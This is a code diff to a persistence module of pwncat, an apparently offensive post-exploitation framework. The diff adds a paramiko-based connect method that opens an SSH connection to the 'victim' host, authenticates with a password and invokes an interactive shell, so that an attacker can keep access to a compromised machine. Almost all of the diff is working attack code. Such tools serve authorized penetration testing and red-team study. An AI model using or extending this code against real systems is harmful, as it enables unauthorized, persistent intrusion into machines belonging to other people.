@@ -7,6 +7,8 @@ import io
 import os
 from typing import Optional
 
+import paramiko
+
 import pwncat
 from pwncat.util import CompilationError, Access
 from pwncat.platform import Platform
@@ -227,3 +229,37 @@ class Module(PersistModule):
 
     def connect(self, user: str, password: str, log: str) -> socket.SocketType:
         """ Connect to the victim with this module """
+
+        try:
+            yield Status("connecting to host")
+            # Connect to the remote host's ssh server
+            sock = socket.create_connection((pwncat.victim.host.ip, 22))
+        except Exception as exc:
+            raise PersistError(str(exc))
+
+        # Create a paramiko SSH transport layer around the socket
+        yield Status("wrapping socket in ssh transport")
+        t = paramiko.Transport(sock)
+        try:
+            t.start_client()
+        except paramiko.SSHException:
+            raise PersistError("ssh negotiation failed")
+
+        # Attempt authentication
+        try:
+            yield Status("authenticating with victim")
+            t.auth_password(user, password)
+        except paramiko.ssh_exception.AuthenticationException:
+            raise PersistError("incorrect password")
+
+        if not t.is_authenticated():
+            t.close()
+            sock.close()
+            raise PersistError("incorrect password")
+
+        # Open an interactive session
+        chan = t.open_session()
+        chan.get_pty()
+        chan.invoke_shell()
+
+        yield chan
